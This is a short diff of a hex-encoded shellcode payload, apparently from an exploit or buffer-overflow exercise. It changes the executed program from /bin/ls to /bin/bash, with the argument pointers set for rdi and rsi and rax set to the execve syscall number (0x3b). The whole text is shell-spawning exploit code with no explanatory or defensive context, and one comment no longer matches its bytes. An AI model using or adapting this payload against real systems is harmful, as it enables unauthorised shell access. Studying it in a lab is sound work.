@@ -1,5 +1,5 @@
-2f 62 69 6e 2f 6c 73 00            /* /bin/ls, this addr will go in rdi */
-00 00 00 00 00 00 00 00            /* -ils */
+2f 62 69 6e 2f 62 61 73            /* /bin/bash, this addr will go in rdi */
+68 00 00 00 00 00 00 00            /* -ils */
 00 00 00 00 00 00 00 00            /* PTR to -ils, this addr will go in rsi */ 
 00 00 00 00 00 00 00 00            /* NULL Byte to end array */
 48 c7 c0 3b 00 00 00               /* mov    $0x3b, %rax */
